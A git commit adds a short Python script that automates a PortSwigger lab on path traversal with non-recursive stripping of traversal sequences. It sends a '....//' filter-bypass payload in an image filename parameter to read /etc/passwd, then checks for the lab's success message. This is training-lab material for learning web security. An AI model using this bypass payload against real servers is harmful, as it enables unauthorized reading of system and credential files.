1b26c56d2104b94d1359ce39ef6920488706e4c6
ma4747gh <ma4747gh@gmail.com>
2024-06-15 15:09:24 +0300

    Adding scripts for all Path traversal labs on PortSwigger.

---
+++ PortSwigger/Server-side topics/Path traversal/Lab: File path traversal, traversal sequences stripped non-recursively.py
@@ -0,0 +1,28 @@
+import requests
+import sys
+
+
+class LabSolver:
+    def __init__(self, lab_url):
+        self.lab_url = lab_url if lab_url.endswith('/') else lab_url + '/'
+        self.session = requests.Session()
+
+    def retrieve_etc_passwd(self):
+        response = self.session.get(self.lab_url + 'image?filename=....//....//....//etc/passwd')
+        print(response.text)
+
+    def check_solution(self):
+        response = self.session.get(self.lab_url)
+        if 'Congratulations, you solved the lab!' in response.text:
+            print('You solved the lab.')
+            print('Coded by Mohamed Ahmed (ma4747gh).')
+            print('My GitHub account: https://github.com/ma4747gh')
+            print('My LinkedIn account: https://eg.linkedin.com/in/ma4747gh')
+
+    def solve(self):
+        self.retrieve_etc_passwd()
+        self.check_solution()
+
+
+solver = LabSolver(sys.argv[1])
+solver.solve()
